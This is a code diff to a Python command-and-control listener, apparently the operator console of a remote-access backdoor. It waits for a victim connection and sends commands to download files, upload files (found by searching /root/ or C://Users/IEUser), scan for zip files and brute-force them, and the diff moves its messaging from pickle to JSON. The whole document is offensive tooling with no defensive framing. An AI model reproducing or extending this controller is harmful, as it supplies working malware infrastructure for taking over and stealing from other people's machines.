@@ -5,12 +5,36 @@ import queue
 import socket
 import threading
 import signal
-import pickle
 import subprocess
 import inspect
 import base64
 import time
 import sys
+import platform
+import json
+
+def check_file(zip_file=None, word_list=None):
+	get_platform = platform.system()
+
+	if get_platform == "Linux":
+		path = "/root/"
+	elif get_platform == "Windows":
+		path = "C://Users/IEUser"
+
+	combine_dir = None
+	for root, dirs, files in os.walk(path):
+		for file in files:
+			if zip_file:
+				if file == zip_file:
+					combine_dir = root + "/" + zip_file
+					if not zipfile.is_zipfile(combine_dir):
+						return False
+			if word_list:
+				if file == word_list:
+					combine_dir = root + "/" + word_list
+					if not os.path.isfile(combine_dir):
+						return False
+	return combine_dir
 
 class Parser:
 	def __init__(self):
@@ -72,36 +96,23 @@ class Socket(Parser):
 		self.socket_connection.bind((self.ip, self.port))
 		print("\n[+] Waiting for a connection")
 
-		self.socket_connection.listen(0)
+		self.socket_connection.listen(1)
 		self.connection, self.address = self.socket_connection.accept()
 
 		self.start_connection()
 
 	def reliable_recieve(self):
-		command_list = ["download", "scan-zip"]
-		my_list = []
-
-		if self.user_input[0] in command_list:
-			self.connection.settimeout(0.50)
-
-		if self.user_input[0] == "brute":
-			self.connection.setblocking(True)
-			
-		else:
-			self.connection.settimeout(0.05)
-
+		json_data = b""
 		while True:
 			try:
-				pickle_data = self.connection.recv(4096)
-				my_list.append(pickle_data)
-				if self.connection.getblocking():
-					return b"".join(my_list)
-			except socket.timeout:
-				return b"".join(my_list)
+				json_data += self.connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
 
 	def reliable_send_recieve(self, data):
-		data_list = pickle.dumps(data)
-		self.connection.send(data_list)
+		data_list = json.dumps(data)
+		self.connection.send(data_list.encode())
 		return self.reliable_recieve()
 
 	def clear(self):
@@ -109,16 +120,30 @@ class Socket(Parser):
 
 	def download_file(self, file):
 		decode = base64.b64decode(file)
+		print(decode)
 		with open(self.user_input[1], "wb") as f:
 			f.write(decode)
 			f.close()
 		print("[+] File downloaded")
+		return
 
+	def upload_file(self, file):
+		file_result = check_file(word_list=file[1])
+
+		if not file_result:
+			print("[-] Invalid file")
+			return "[-]"
+		
+		with open(file_result, "rb") as f:
+			data = f.read()
+			f.close()
+		encode = base64.b64encode(data).decode("ascii")
+		return [self.user_input[0], self.user_input[1], encode]
 
 	def command_options(self):
 		return {
 			"clear": self.clear,
-			"download": self.download_file
+			"download": self.download_file,
 		}
 
 	def start_connection(self):
@@ -129,13 +154,18 @@ class Socket(Parser):
 			try:
 				self.user_input = input(">> ")
 				self.user_input = self.user_input.split()
+
+				if self.user_input[0] == "upload":
+					result = self.reliable_send_recieve(self.upload_file(self.user_input))
+					print(result)
+					continue
+
 				result = self.reliable_send_recieve(self.user_input)
 
 				if self.user_input[0] == "scan-zip":
 					print("[+] Printing Zip files")
-					result = pickle.loads(result)
-					for words in result:
-						print(words)
+					for letters in result:
+						print(letters)
 
 				elif self.user_input[0] in get_command_options:
 					if len(inspect.getfullargspec(get_command_options[self.user_input[0]])[0]) > 1:
@@ -143,9 +173,10 @@ class Socket(Parser):
 						continue
 					else:
 						get_command_options[self.user_input[0]]()
-					print(result.decode())
+						print(result)
+						continue
 				else:
-					print(result.decode())
+					print(result)
 			except IndexError:
 				print("[-] Invalid command")
 				continue
